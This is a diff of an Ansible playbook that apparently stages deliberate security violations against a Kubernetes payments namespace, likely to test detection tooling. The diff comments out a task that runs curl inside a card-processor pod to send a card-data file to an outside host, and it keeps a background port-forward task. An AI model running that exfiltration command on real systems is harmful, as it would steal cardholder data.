@@ -33,11 +33,11 @@
       - app=mastercard-processor
   register: r_processor_pod
 
-- name: k8s_exec violation
-  kubernetes.core.k8s_exec:
-    namespace: payments
-    pod: "{{ r_processor_pod.resources[0].metadata.name }}"
-    command: 'curl -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'
+#- name: k8s_exec violation
+#  kubernetes.core.k8s_exec:
+#    namespace: payments
+#    pod: "{{ r_processor_pod.resources[0].metadata.name }}"
+#    command: 'curl -X POST --data-binary @/var/lib/processor/card_data http://innocent.site.web'
 
 - name: k8s_portforward violation
   shell: "oc -n payments port-forward service/mastercard-processor-service 30000:8080 1>/dev/null 2>&1 &"
